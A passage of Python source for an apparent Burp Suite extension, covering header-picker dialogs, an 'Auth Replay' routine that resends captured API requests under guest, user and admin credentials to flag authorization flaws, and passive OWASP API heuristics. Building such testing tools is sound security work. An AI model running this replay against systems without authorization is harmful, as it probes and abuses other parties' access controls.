        top_row.add(search_field)
        chooser_panel.add(top_row, BorderLayout.NORTH)

        list_model = DefaultListModel()
        candidate_list = JList(list_model)
        candidate_list.setVisibleRowCount(12)
        candidate_scroll = JScrollPane(candidate_list)
        candidate_scroll.setPreferredSize(Dimension(1080, 260))
        chooser_panel.add(candidate_scroll, BorderLayout.CENTER)

        footer = JLabel(
            "Type to filter by endpoint/header text. Select one item then click OK."
        )
        chooser_panel.add(footer, BorderLayout.SOUTH)

        visible_indices = []

        def rebuild_visible_candidates():
            query = search_field.getText().strip().lower()
            list_model.clear()
            visible_indices[:] = []
            for idx, option in enumerate(options):
                searchable = "{} {} {}".format(
                    option.get("label", ""),
                    option.get("value", ""),
                    option.get("endpoint", ""),
                ).lower()
                if query and query not in searchable:
                    continue
                list_model.addElement(option.get("label", ""))
                visible_indices.append(idx)
            if list_model.getSize() > 0:
                candidate_list.setSelectedIndex(0)

        class HeaderFilterListener(DocumentListener):
            def insertUpdate(self, e):
                rebuild_visible_candidates()

            def removeUpdate(self, e):
                rebuild_visible_candidates()

            def changedUpdate(self, e):
                rebuild_visible_candidates()

        search_field.getDocument().addDocumentListener(HeaderFilterListener())
        rebuild_visible_candidates()

        result = JOptionPane.showConfirmDialog(
            self._panel,
            chooser_panel,
            "{} Header Extract".format(profile_key.capitalize()),
            JOptionPane.OK_CANCEL_OPTION,
            JOptionPane.PLAIN_MESSAGE,
        )
        if result != JOptionPane.OK_OPTION:
            return None

        selected_idx = candidate_list.getSelectedIndex()
        if selected_idx < 0 or selected_idx >= len(visible_indices):
            self.auth_replay_area.append(
                "[!] No {} header selected from popup.\n".format(profile_key)
            )
            return None

        option_index = visible_indices[selected_idx]
        if option_index < 0 or option_index >= len(options):
            self.auth_replay_area.append(
                "[!] Invalid {} header selection index.\n".format(profile_key)
            )
            return None
        return options[option_index]

    def _parse_comma_newline_values(self, text):
        """Parse comma/newline text into ordered unique values."""
        values = []
        seen = set()
        raw = self._ascii_safe(text or "")
        for part in re.split(r"[\n,]+", raw):
            value = self._ascii_safe(part).strip()
            if not value or value in seen:
                continue
            seen.add(value)
            values.append(value)
        return values

    def _show_multi_select_targets_popup(
        self, title, options, preselected_values=None, footer_text=""
    ):
        """Show searchable multi-select popup and return selected values."""
        normalized_options = []
        seen = set()
        for item in (options or []):
            value = self._ascii_safe(item.get("value") or "").strip()
            if (not value) or value in seen:
                continue
            seen.add(value)
            label = self._ascii_safe(item.get("label") or value).strip()
            normalized_options.append({"value": value, "label": label})

        if not normalized_options:
            return []

        selected = set()
        for value in (preselected_values or []):
            safe_value = self._ascii_safe(value).strip()
            if safe_value:
                selected.add(safe_value)
        if not selected:
            selected = set([item.get("value") for item in normalized_options])

        chooser_panel = JPanel(BorderLayout(6, 6))
        top_row = JPanel(FlowLayout(FlowLayout.LEFT))
        top_row.add(JLabel("Filter:"))
        search_field = JTextField("", 36)
        top_row.add(search_field)

        select_all_btn = JButton("Select All")
        clear_btn = JButton("Clear")
        top_row.add(select_all_btn)
        top_row.add(clear_btn)
        chooser_panel.add(top_row, BorderLayout.NORTH)

        checkbox_panel = JPanel()
        checkbox_panel.setLayout(BoxLayout(checkbox_panel, BoxLayout.Y_AXIS))
        scroll = JScrollPane(checkbox_panel)
        scroll.setPreferredSize(Dimension(1080, 300))
        chooser_panel.add(scroll, BorderLayout.CENTER)

        chooser_panel.add(
            JLabel(
                footer_text
                or "Selected items are applied when you click OK. Use Filter to narrow the list."
            ),
            BorderLayout.SOUTH,
        )

        visible_boxes = []

        def rebuild():
            query = self._ascii_safe(search_field.getText(), lower=True).strip()
            checkbox_panel.removeAll()
            del visible_boxes[:]

            matched = 0
            for item in normalized_options:
                value = item.get("value")
                label = item.get("label")
                searchable = self._ascii_safe(
                    "{} {}".format(label, value), lower=True
                )
                if query and query not in searchable:
                    continue

                checkbox = JCheckBox(label, value in selected)
                checkbox.setToolTipText(value)
                checkbox.addActionListener(
                    lambda e, v=value, cb=checkbox: selected.add(v)
                    if cb.isSelected()
                    else selected.discard(v)
                )
                checkbox_panel.add(checkbox)
                visible_boxes.append({"value": value, "box": checkbox})
                matched += 1

            if matched == 0:
                checkbox_panel.add(JLabel("No matches."))

            checkbox_panel.revalidate()
            checkbox_panel.repaint()

        class TargetPopupFilterListener(DocumentListener):
            def insertUpdate(self, e):
                rebuild()

            def removeUpdate(self, e):
                rebuild()

            def changedUpdate(self, e):
                rebuild()

        def select_visible(event):
            for item in visible_boxes:
                value = item.get("value")
                box = item.get("box")
                if box is not None:
                    box.setSelected(True)
                if value:
                    selected.add(value)

        def clear_visible(event):
            for item in visible_boxes:
                value = item.get("value")
                box = item.get("box")
                if box is not None:
                    box.setSelected(False)
                if value in selected:
                    selected.remove(value)

        search_field.getDocument().addDocumentListener(TargetPopupFilterListener())
        select_all_btn.addActionListener(select_visible)
        clear_btn.addActionListener(clear_visible)
        rebuild()

        result = JOptionPane.showConfirmDialog(
            self._panel,
            chooser_panel,
            self._ascii_safe(title) or "Targets",
            JOptionPane.OK_CANCEL_OPTION,
            JOptionPane.PLAIN_MESSAGE,
        )
        if result != JOptionPane.OK_OPTION:
            return None

        return [
            item.get("value")
            for item in normalized_options
            if item.get("value") in selected
        ]

    def _extract_auth_profile_header(self, profile_key):
        """Extract profile header candidates and let user choose via popup."""
        profile_key = (profile_key or "").strip().lower()
        field = self._get_auth_profile_field(profile_key)
        if field is None:
            self.auth_replay_area.append("[!] Unknown profile: {}\n".format(profile_key))
            return

        selected_key = self._get_selected_endpoint_key()
        with self.lock:
            data_snapshot = list(self.api_data.items())

        options = []
        seen_values = set()
        max_options = 35

        def add_option(endpoint_key, header_line, is_selected):
            if not header_line:
                return
            normalized = header_line.strip().lower()
            if not normalized or normalized in seen_values:
                return
            if len(options) >= max_options:
                return
            options.append(
                {
                    "label": self._build_auth_header_choice_label(
                        len(options) + 1, endpoint_key, header_line, is_selected
                    ),
                    "value": header_line,
                    "endpoint": endpoint_key,
                }
            )
            seen_values.add(normalized)

        if selected_key:
            selected_entries = None
            for endpoint_key, entries in data_snapshot:
                if endpoint_key == selected_key:
                    selected_entries = entries
                    break
            if selected_entries:
                selected_candidates = self._find_profile_header_candidates_in_entries(
                    selected_entries, profile_key, prefer_match=True, max_candidates=12
                )
                if not selected_candidates:
                    selected_candidates = self._find_profile_header_candidates_in_entries(
                        selected_entries, profile_key, prefer_match=False, max_candidates=12
                    )
                for header_line in selected_candidates:
                    add_option(selected_key, header_line, True)

        for endpoint_key, entries in data_snapshot:
            if len(options) >= max_options:
                break
            if selected_key and endpoint_key == selected_key:
                continue
            candidates = self._find_profile_header_candidates_in_entries(
                entries, profile_key, prefer_match=True, max_candidates=4
            )
            for header_line in candidates:
                add_option(endpoint_key, header_line, False)
                if len(options) >= max_options:
                    break

        if not options:
            for endpoint_key, entries in data_snapshot:
                if len(options) >= max_options:
                    break
                if selected_key and endpoint_key == selected_key:
                    continue
                candidates = self._find_profile_header_candidates_in_entries(
                    entries, profile_key, prefer_match=False, max_candidates=3
                )
                for header_line in candidates:
                    add_option(endpoint_key, header_line, False)
                    if len(options) >= max_options:
                        break

        if not options:
            self.auth_replay_area.append(
                "[!] No {} header candidate found. Select endpoint with auth/cookie headers and retry.\n".format(
                    profile_key
                )
            )
            return

        chosen = self._choose_auth_profile_header_candidate(profile_key, options)
        if chosen is None:
            self.auth_replay_area.append(
                "[*] {} header extraction cancelled by user.\n".format(
                    profile_key.capitalize()
                )
            )
            return

        field.setText(chosen["value"])
        self.auth_replay_area.append(
            "[+] {} header selected from {}.\n".format(
                profile_key.capitalize(), chosen["endpoint"]
            )
        )

    def _build_auth_replay_request(self, entry, profile_header):
        """Build raw HTTP request with optional auth/profile header override."""
        method = (entry.get("method") or "GET").upper()
        path = entry.get("path") or "/"
        query = entry.get("query_string") or ""
        if query:
            path += "?" + query

        request_line = "{} {} HTTP/1.1\r\n".format(method, path)
        headers = ["Host: {}".format(entry.get("host", ""))]
        existing_headers = entry.get("headers", {}) or {}

        override_header_name = None
        if profile_header:
            override_header_name = profile_header[0].lower()

        added = set(["host"])
        for key, value in existing_headers.items():
            key_str = str(key)
            value_str = str(value)
            key_lower = key_str.lower()
            if key_lower in ["host", "content-length", "connection"]:
                continue
            if override_header_name and key_lower == override_header_name:
                continue
            headers.append("{}: {}".format(key_str, value_str))
            added.add(key_lower)

        if "user-agent" not in added:
            headers.append("User-Agent: BurpAPISecuritySuite/AuthReplay")
        if "accept" not in added:
            headers.append("Accept: */*")
        headers.append("Connection: close")

        if profile_header:
            headers.append("{}: {}".format(profile_header[0], profile_header[1]))

        body = entry.get("request_body") or ""
        if body:
            headers.append("Content-Length: {}".format(len(body)))

        request = request_line + "\r\n".join(headers) + "\r\n\r\n"
        if body:
            request += body
        return request

    def _perform_auth_replay_request(self, entry, profile_header):
        """Send request and return compact response signature."""
        host = entry.get("host", "")
        protocol = entry.get("protocol", "https")
        use_https = protocol == "https"
        port = entry.get("port", -1)
        if port == -1:
            port = 443 if use_https else 80

        request = self._build_auth_replay_request(entry, profile_header)
        request_bytes = self._helpers.stringToBytes(request)

        try:
            response_obj = self._callbacks.makeHttpRequest(
                host, port, use_https, request_bytes
            )
        except Exception as e:
            return {
                "status": 0,
                "length": 0,
                "preview": "",
                "error": "request failed: {}".format(str(e)),
            }

        response = response_obj
        if hasattr(response_obj, "getResponse"):
            response = response_obj.getResponse()

        if not response:
            return {
                "status": 0,
                "length": 0,
                "preview": "",
                "error": "empty response",
            }

        try:
            resp_info = self._helpers.analyzeResponse(response)
            body_offset = resp_info.getBodyOffset()
            response_len = max(0, len(response) - body_offset)
            preview_bytes = response[body_offset : body_offset + 320]
            preview = self._helpers.bytesToString(preview_bytes)
            preview = re.sub(r"\s+", " ", (preview or "")).strip()
            return {
                "status": resp_info.getStatusCode(),
                "length": response_len,
                "preview": preview,
                "error": None,
            }
        except Exception as e:
            return {
                "status": 0,
                "length": 0,
                "preview": "",
                "error": "response parse failed: {}".format(str(e)),
            }

    def _auth_replay_preview_similar(self, left_preview, right_preview):
        """Loose similarity check for body previews."""
        left = (left_preview or "").lower()
        right = (right_preview or "").lower()
        left = re.sub(r"\s+", " ", left)
        right = re.sub(r"\s+", " ", right)
        left = re.sub(r"[0-9a-f]{24,}", "{token}", left)
        right = re.sub(r"[0-9a-f]{24,}", "{token}", right)
        left = re.sub(r"\d+", "0", left)
        right = re.sub(r"\d+", "0", right)

        if not left and not right:
            return True
        if left == right:
            return True

        overlap = min(len(left), len(right), 140)
        if overlap >= 40 and left[:overlap] == right[:overlap]:
            return True
        return False

    def _evaluate_auth_replay_findings(self, endpoint_key, role_results):
        """Score likely authorization issues from role response signatures."""
        findings = []
        if "admin" in role_results:
            high_role = "admin"
        elif "user" in role_results:
            high_role = "user"
        else:
            high_role = "guest"

        high_data = role_results.get(high_role, {})
        if high_data.get("error"):
            return findings

        success_codes = set([200, 201, 202, 204, 206])
        compare_roles = [role for role in ["guest", "user"] if role in role_results]
        for low_role in compare_roles:
            if low_role == high_role:
                continue
            low_data = role_results.get(low_role, {})
            if low_data.get("error"):
                continue

            low_status = int(low_data.get("status", 0) or 0)
            high_status = int(high_data.get("status", 0) or 0)
            low_len = int(low_data.get("length", 0) or 0)
            high_len = int(high_data.get("length", 0) or 0)
            similar_preview = self._auth_replay_preview_similar(
                low_data.get("preview", ""), high_data.get("preview", "")
            )
            length_delta = abs(low_len - high_len)
            length_close = length_delta <= max(32, int(max(low_len, high_len) * 0.12))

            finding = None
            if (
                low_status in success_codes
                and high_status in success_codes
                and low_status == high_status
                and (similar_preview or length_close)
            ):
                severity = (
                    "critical"
                    if low_role == "guest" and high_role == "admin"
                    else "high"
                )
                finding = {
                    "severity": severity,
                    "endpoint": endpoint_key,
                    "issue": "{} response looks similar to {} response".format(
                        low_role, high_role
                    ),
                    "low_role": low_role,
                    "high_role": high_role,
                    "low_status": low_status,
                    "high_status": high_status,
                    "low_length": low_len,
                    "high_length": high_len,
                }
            elif low_status in success_codes and high_status in [401, 403]:
                finding = {
                    "severity": "high",
                    "endpoint": endpoint_key,
                    "issue": "{} access succeeded while {} was denied".format(
                        low_role, high_role
                    ),
                    "low_role": low_role,
                    "high_role": high_role,
                    "low_status": low_status,
                    "high_status": high_status,
                    "low_length": low_len,
                    "high_length": high_len,
                }
            elif (
                low_status == high_status
                and low_status not in [0, 401, 403, 404]
                and length_close
                and similar_preview
            ):
                finding = {
                    "severity": "medium",
                    "endpoint": endpoint_key,
                    "issue": "{} and {} responses are nearly identical".format(
                        low_role, high_role
                    ),
                    "low_role": low_role,
                    "high_role": high_role,
                    "low_status": low_status,
                    "high_status": high_status,
                    "low_length": low_len,
                    "high_length": high_len,
                }

            if finding:
                findings.append(finding)

        return findings

    def _collect_auth_replay_targets(self, scope, max_count):
        """Collect endpoint keys based on replay scope."""
        keys = []
        if scope == "Selected Endpoint":
            selected_value = self.endpoint_list.getSelectedValue()
            if not selected_value:
                return [], 0
            endpoint_key = EndpointClickListener._extract_endpoint_key(str(selected_value))
            if not endpoint_key:
                return [], 0
            keys = [endpoint_key]
        elif scope == "Filtered View":
            with self.lock:
                keys = list(self._filter_endpoints().keys())
        else:
            with self.lock:
                keys = list(self.api_data.keys())

        prioritized = []
        with self.lock:
            for endpoint_key in keys:
                entries = self.api_data.get(endpoint_key)
                if not entries:
                    continue
                entry = self._get_entry(entries)
                severity = self._get_severity(endpoint_key, entries)
                severity_rank = {"critical": 0, "high": 1, "medium": 2, "info": 3}
                id_like = (
                    0
                    if re.search(
                        r"/{id}|/{uuid}|/{objectid}", entry.get("normalized_path", "")
                    )
                    else 1
                )
                prioritized.append(
                    (
                        severity_rank.get(severity, 4),
                        id_like,
                        endpoint_key,
                    )
                )

        prioritized.sort(key=lambda item: (item[0], item[1], item[2]))
        ordered_keys = [item[2] for item in prioritized]
        total_available = len(ordered_keys)
        if max_count > 0:
            ordered_keys = ordered_keys[:max_count]
        return ordered_keys, total_available

    def _run_auth_replay(self, event):
        """Replay endpoints across roles and score likely authz weaknesses."""
        if not self.api_data:
            self.auth_replay_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        max_text = self.auth_replay_max_field.getText().strip() or "50"
        try:
            max_count = int(max_text)
            if max_count < 1:
                max_count = 1
            if max_count > 500:
                max_count = 500
        except ValueError:
            max_count = 50

        try:
            guest_header = self._parse_auth_profile_header(
                "Guest", self.auth_guest_header_field.getText()
            )
            user_header = self._parse_auth_profile_header(
                "User", self.auth_user_header_field.getText()
            )
            admin_header = self._parse_auth_profile_header(
                "Admin", self.auth_admin_header_field.getText()
            )
        except ValueError as e:
            self.auth_replay_area.setText("[!] {}\n".format(str(e)))
            return

        profiles = [("guest", guest_header)]
        if user_header:
            profiles.append(("user", user_header))
        if admin_header:
            profiles.append(("admin", admin_header))
        if len(profiles) < 2:
            self.auth_replay_area.setText(
                "[!] Provide at least one non-empty User or Admin header\n"
            )
            self.auth_replay_area.append(
                "[*] Header format: Authorization: Bearer <token>\n"
            )
            return

        scope = str(self.auth_replay_scope_combo.getSelectedItem())
        endpoint_keys, total_available = self._collect_auth_replay_targets(scope, max_count)
        if not endpoint_keys:
            self.auth_replay_area.setText(
                "[!] No endpoints found for scope '{}'\n".format(scope)
            )
            if scope == "Selected Endpoint":
                self.auth_replay_area.append(
                    "[*] Select one endpoint from Recon list and retry\n"
                )
            return

        self._clear_tool_cancel("authreplay")
        self.auth_replay_area.setText("[*] Starting Auth Replay MVP...\n")
        self.auth_replay_area.append("[*] Scope: {}\n".format(scope))
        self.auth_replay_area.append(
            "[*] Targets: {} of {} available\n".format(
                len(endpoint_keys), total_available
            )
        )
        self.auth_replay_area.append(
            "[*] Profiles: {}\n".format(
                ", ".join([name for name, _ in profiles])
            )
        )
        self.auth_replay_area.append(
            "[*] Tip: use Stop to cancel the run at any time\n\n"
        )
        self.log_to_ui(
            "[*] Auth Replay: {} targets, profiles={}".format(
                len(endpoint_keys), ",".join([name for name, _ in profiles])
            )
        )

        def run_replay():
            findings = []
            scanned = 0
            cancelled = False
            errors = 0

            try:
                idx = 0
                for endpoint_key in endpoint_keys:
                    if self._is_tool_cancelled("authreplay"):
                        cancelled = True
                        break

                    idx += 1
                    if idx == 1 or idx % 5 == 0:
                        SwingUtilities.invokeLater(
                            lambda i=idx, total=len(endpoint_keys): self.auth_replay_area.append(
                                "[*] Replaying {}/{}...\n".format(i, total)
                            )
                        )

                    with self.lock:
                        entries = self.api_data.get(endpoint_key)
                    if not entries:
                        continue

                    entry = self._get_entry(entries)
                    role_results = {}
                    for role_name, role_header in profiles:
                        if self._is_tool_cancelled("authreplay"):
                            cancelled = True
                            break
                        result = self._perform_auth_replay_request(entry, role_header)
                        role_results[role_name] = result
                        if result.get("error"):
                            errors += 1

                    if cancelled:
                        break

                    endpoint_findings = self._evaluate_auth_replay_findings(
                        endpoint_key, role_results
                    )
                    findings.extend(endpoint_findings)
                    scanned += 1

                severity_order = {"critical": 0, "high": 1, "medium": 2}
                findings.sort(
                    key=lambda f: (
                        severity_order.get(f.get("severity", "medium"), 3),
                        f.get("endpoint", ""),
                    )
                )
                with self.auth_replay_lock:
                    self.auth_replay_findings = list(findings)

                severity_counts = {"critical": 0, "high": 0, "medium": 0}
                for finding in findings:
                    sev = finding.get("severity", "medium")
                    if sev in severity_counts:
                        severity_counts[sev] += 1

                output = []
                output.append("")
                output.append("=" * 80)
                output.append("AUTH REPLAY RESULTS")
                output.append("=" * 80)
                output.append("[*] Scanned Endpoints: {}".format(scanned))
                output.append("[*] Findings: {}".format(len(findings)))
                output.append("[*] Request Errors: {}".format(errors))
                if cancelled:
                    output.append("[!] Run cancelled by user")
                output.append(
                    "[*] Severity: Critical={} High={} Medium={}".format(
                        severity_counts["critical"],
                        severity_counts["high"],
                        severity_counts["medium"],
                    )
                )
                output.append("")

                if findings:
                    output.append("TOP FINDINGS")
                    output.append("-" * 80)
                    for finding in findings[:25]:
                        output.append(
                            "[{}] {}".format(
                                finding.get("severity", "medium").upper(),
                                finding.get("issue", ""),
                            )
                        )
                        output.append("  Endpoint: {}".format(finding.get("endpoint", "")))
                        output.append(
                            "  {} status/len: {}/{} | {} status/len: {}/{}".format(
                                finding.get("low_role", "low"),
                                finding.get("low_status", 0),
                                finding.get("low_length", 0),
                                finding.get("high_role", "high"),
                                finding.get("high_status", 0),
                                finding.get("high_length", 0),
                            )
                        )
                        output.append("")
                    if len(findings) > 25:
                        output.append("[*] {} more findings not shown".format(len(findings) - 25))
                else:
                    output.append("[+] No obvious cross-role authz issues detected")
                    output.append("[*] Try broader endpoint scope or different tokens")

                result_text = "\n".join(output) + "\n"
                SwingUtilities.invokeLater(
                    lambda t=result_text: self.auth_replay_area.append(t)
                )
                if cancelled:
                    SwingUtilities.invokeLater(
                        lambda: self.log_to_ui(
                            "[!] Auth Replay cancelled ({} scanned, {} findings)".format(
                                scanned, len(findings)
                            )
                        )
                    )
                else:
                    SwingUtilities.invokeLater(
                        lambda: self.log_to_ui(
                            "[+] Auth Replay complete ({} scanned, {} findings)".format(
                                scanned, len(findings)
                            )
                        )
                    )
            except Exception as e:
                err = "[!] Auth Replay failed: {}\n".format(str(e))
                SwingUtilities.invokeLater(lambda t=err: self.auth_replay_area.append(t))
                err_msg = str(e)
                SwingUtilities.invokeLater(
                    lambda m=err_msg: self.log_to_ui("[!] Auth Replay error: {}".format(m))
                )
            finally:
                self._clear_tool_cancel("authreplay")

        thread = threading.Thread(target=run_replay)
        thread.daemon = True
        thread.start()

    def _run_passive_discovery(self, event):
        """Run passive API3/API4/API5/API6/API9/API10 heuristics from captured history."""
        if not self.api_data:
            self.passive_area.setText(
                "[!] No endpoints in Recon tab. Capture or import first\n"
            )
            return

        max_text = self.passive_max_field.getText().strip() or "250"
        try:
            max_count = int(max_text)
            if max_count < 1:
                max_count = 1
            if max_count > 1000:
                max_count = 1000
        except ValueError:
            max_count = 250

        scope = str(self.passive_scope_combo.getSelectedItem())
        mode = str(self.passive_mode_combo.getSelectedItem())
        endpoint_keys, total_available = self._collect_auth_replay_targets(scope, max_count)
        if not endpoint_keys:
            self.passive_area.setText(
                "[!] No endpoints found for scope '{}'\n".format(scope)
            )
            return

        self.passive_area.setText("[*] Starting passive discovery...\n")
        self.passive_area.append(
            "[*] Scope: {} | Mode: {} | Targets: {} of {}\n\n".format(
                scope, mode, len(endpoint_keys), total_available
            )
        )

        def run_passive():
            try:
                snapshot = self._collect_passive_snapshot(endpoint_keys)
                findings = self._run_passive_mode_handlers(mode, snapshot)
                findings = self._sort_and_store_passive_findings(findings)

                text = self._format_passive_discovery_output(
                    findings, len(snapshot), total_available, mode
                )
                SwingUtilities.invokeLater(lambda t=text: self.passive_area.setText(t))
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] Passive discovery complete ({} findings)".format(
                            len(findings)
                        )
                    )
                )
            except Exception as e:
                err_msg = self._ascii_safe(e)
                err = "[!] Passive discovery failed: {}\n".format(err_msg)
                SwingUtilities.invokeLater(lambda t=err: self.passive_area.append(t))
                SwingUtilities.invokeLater(
                    lambda m=err_msg: self.log_to_ui(
                        "[!] Passive discovery error: {}".format(m)
                    )
                )

        worker = threading.Thread(target=run_passive)
        worker.daemon = True
        worker.start()

    def _collect_passive_snapshot(self, endpoint_keys):
        """Collect immutable-ish endpoint snapshot for passive processing."""
        raw_snapshot = {}
        with self.lock:
            for key in endpoint_keys:
                raw_entries = self.api_data.get(key)
                if not raw_entries:
                    continue
                if isinstance(raw_entries, list):
                    raw_snapshot[key] = list(raw_entries)
                elif isinstance(raw_entries, dict):
                    raw_snapshot[key] = [raw_entries]
                else:
                    self._callbacks.printError(
                        "Passive snapshot skip {} (unsupported type: {})".format(
                            key, type(raw_entries)
                        )
                    )
        filter_cfg = self._build_passive_filter_config(raw_snapshot)
        snapshot = {}
        for key, entries in raw_snapshot.items():
            filtered_entries = []
            for entry in entries:
                if not isinstance(entry, dict):
                    continue
                if self._passive_entry_allowed(entry, filter_cfg):
                    filtered_entries.append(entry)
            if filtered_entries:
                snapshot[key] = filtered_entries
        return snapshot

    def _build_passive_filter_config(self, snapshot):
        """Build passive filtering config to focus heuristics on API-like first-party traffic."""
        scope_override = self._get_target_scope_override()
        selected_host = "all"
        force_host = False
        if not scope_override.get("enabled"):
            try:
                if hasattr(self, "host_filter") and self.host_filter is not None:
                    selected_host = self._ascii_safe(
                        str(self.host_filter.getSelectedItem()), lower=True
                    ).strip() or "all"
            except Exception as e:
                self._callbacks.printError("Passive host-filter read error: {}".format(str(e)))
                selected_host = "all"
            force_host = bool(selected_host and selected_host != "all")

        entries_snapshot = []
        for entries in snapshot.values():
            entries_list = entries if isinstance(entries, list) else [entries]
            for entry in entries_list:
                if isinstance(entry, dict):
                    entries_snapshot.append(entry)

        host_counts = {}
        base_scores = {}
        for entry in entries_snapshot:
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            host_counts[host] = host_counts.get(host, 0) + 1
            if (not scope_override.get("enabled")) and self._is_wayback_noise_host(host):
                continue
            base = self._infer_base_domain(host)
            if not base:
                continue

            score = 1
            method = self._ascii_safe(entry.get("method"), lower=True).strip()
            if method in ["post", "put", "patch", "delete"]:
                score += 3

            path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True)
            if (
                "/api/" in path
                or "/graphql" in path
                or "/rest/" in path
                or "/openapi" in path
                or "/swagger" in path
                or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
            ):
                score += 3

            content_type = self._ascii_safe(entry.get("content_type"), lower=True)
            if "json" in content_type or "xml" in content_type:
                score += 2

            api_patterns = [
                self._ascii_safe(x, lower=True)
                for x in (entry.get("api_patterns", []) or [])
            ]
            if any(hint in api_patterns for hint in self.PASSIVE_API_PATTERN_HINTS):
                score += 2

            base_scores[base] = base_scores.get(base, 0) + score

        if scope_override.get("enabled"):
            allowed_bases = set(scope_override.get("bases", set()))
        elif force_host:
            base = self._infer_base_domain(selected_host)
            allowed_bases = set([base]) if base else set()
        else:
            sorted_bases = sorted(base_scores.items(), key=lambda item: (-item[1], item[0]))
            allowed_bases = set([base for base, _ in sorted_bases[:1]])
            if not allowed_bases:
                fallback_bases = {}
                for host, count in host_counts.items():
                    if self._is_wayback_noise_host(host):
                        continue
                    base = self._infer_base_domain(host)
                    if not base:
                        continue
                    fallback_bases[base] = fallback_bases.get(base, 0) + count
                fallback_sorted = sorted(
                    fallback_bases.items(), key=lambda item: (-item[1], item[0])
                )
                allowed_bases = set([base for base, _ in fallback_sorted[:1]])

        return {
            "scope_override_enabled": bool(scope_override.get("enabled")),
            "scope_override": scope_override,
            "force_host": force_host,
            "selected_host": selected_host,
            "allowed_bases": allowed_bases,
        }

    def _passive_entry_is_api_like(self, entry):
        """Heuristic gate to keep passive checks focused on API-like traffic."""
        method = self._ascii_safe(entry.get("method"), lower=True).strip().upper()
        path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True).strip()
        content_type = self._ascii_safe(entry.get("content_type"), lower=True).strip()
        api_patterns = [
            self._ascii_safe(x, lower=True)
            for x in (entry.get("api_patterns", []) or [])
        ]

        first_part = ""
        parts = [p for p in path.strip("/").split("/") if p]
        if parts:
            first_part = parts[0]

        has_api_marker = bool(
            "/api/" in path
            or "/graphql" in path
            or "/rest/" in path
            or "/openapi" in path
            or "/swagger" in path
            or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
        )
        has_structured_content = bool(
            ("json" in content_type or "xml" in content_type or "protobuf" in content_type)
            and ("javascript" not in content_type)
            and ("html" not in content_type)
        )
        has_api_pattern = any(
            hint in api_patterns for hint in self.PASSIVE_API_PATTERN_HINTS
        )
        has_write_method = method in ["POST", "PUT", "PATCH", "DELETE"]

        query_text = self._ascii_safe(entry.get("query_string") or "")
        query_count = len([p for p in query_text.split("&") if p]) if query_text else 0
        param_count = query_count
        params = entry.get("parameters", {}) or {}
        if isinstance(params, dict):
            for value in params.values():
                if isinstance(value, dict):
                    param_count += len(value)
                elif isinstance(value, list):
                    param_count += len(value)

        if method in ["GET", "HEAD", "OPTIONS"]:
            if path.endswith(self.PASSIVE_STATIC_EXTENSIONS):
                return False
            if first_part in self.PASSIVE_STATIC_PATH_PARTS:
                return False
            if self._ffuf_is_noise_path_segment(first_part):
                return False
            if (
                "javascript" in content_type
                or "ecmascript" in content_type
                or "text/css" in content_type
                or content_type.startswith("image/")
                or content_type.startswith("font/")
                or content_type.startswith("video/")
                or content_type.startswith("audio/")
            ):
                return False
            if (
                "html" in content_type
                and not has_api_marker
                and not has_structured_content
                and param_count < 5
            ):
                return False

        if len(path) > 220 and not (has_api_marker or has_structured_content or has_write_method):
            return False
        if re.search(r"/[a-z0-9_-]{80,}", path) and not (
            has_api_marker or has_structured_content or has_write_method
        ):
            return False

        if has_write_method:
            return True
        if has_api_marker or has_structured_content or has_api_pattern:
            return True
        if param_count >= 6 and first_part and first_part not in self.PASSIVE_STATIC_PATH_PARTS:
            return True
        return False

    def _passive_entry_allowed(self, entry, filter_cfg):
        """Enforce passive host scope + API-likeness filtering."""
        host = self._ascii_safe(entry.get("host"), lower=True).strip()
        if not host:
            return False

        scope_override_enabled = bool(filter_cfg.get("scope_override_enabled"))
        scope_override = filter_cfg.get("scope_override", {})
        if scope_override_enabled:
            if not self._host_matches_target_scope(host, scope_override):
                return False
        elif filter_cfg.get("force_host"):
            if host != filter_cfg.get("selected_host"):
                return False
        else:
            if self._is_wayback_noise_host(host):
                return False
            allowed_bases = set(filter_cfg.get("allowed_bases", set()))
            if allowed_bases:
                host_base = self._infer_base_domain(host)
                if host_base not in allowed_bases:
                    return False

        return self._passive_entry_is_api_like(entry)

    def _run_passive_mode_handlers(self, mode, snapshot):
        """Run passive discovery handlers selected by UI mode."""
        findings = []
        handlers = [
            ("API5 (BFLA)", self._passive_discover_api5),
            ("API3 (Data)", self._passive_discover_api3),
            ("API4 (Resource)", self._passive_discover_api4),
            ("API6 (Flows)", self._passive_discover_api6),
            ("API9 (Version)", self._passive_discover_api9),
            ("API10 (Consumption)", self._passive_discover_api10),
        ]
        for mode_name, handler in handlers:
            if mode in ["All", mode_name]:
                findings.extend(handler(snapshot))
        return findings

    def _sort_and_store_passive_findings(self, findings):
        """Sort and persist passive findings snapshot for export."""
        severity_order = {"critical": 0, "high": 1, "medium": 2, "info": 3}
        ordered = sorted(
            findings,
            key=lambda x: (
                severity_order.get(
                    self._ascii_safe(x.get("severity", "info"), lower=True), 4
                ),
                self._ascii_safe(x.get("category", ""), lower=True),
                self._ascii_safe(x.get("endpoint", ""), lower=True),
            ),
        )
        with self.passive_discovery_lock:
            self.passive_discovery_findings = list(ordered)
        return ordered

    def _passive_discover_api5(self, snapshot):
        """Heuristic passive API5/BFLA detection from endpoint history."""
        findings = []
        success_codes = set([200, 201, 202, 204, 206])
        write_methods = set(["POST", "PUT", "PATCH", "DELETE"])

        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            if not entries_list:
                continue
            entry = self._get_entry(entries_list)
            path = self._ascii_safe(entry.get("normalized_path", "") or "", lower=True)
            method = self._ascii_safe(entry.get("method", "") or "").upper()
            id_like_path = bool(re.search(r"/{id}|/{uuid}|/{objectid}", path))
            sensitive_path = bool(self.PASSIVE_ADMIN_PATH_PATTERN.search(path)) or id_like_path
            if not sensitive_path and method not in write_methods:
                continue

            success_entries = [
                e
                for e in entries_list
                if int(e.get("response_status", 0) or 0) in success_codes
            ]
            if not success_entries:
                continue

            fp_to_sigs = {}
            for e in success_entries:
                fp = self._passive_auth_fingerprint(e)
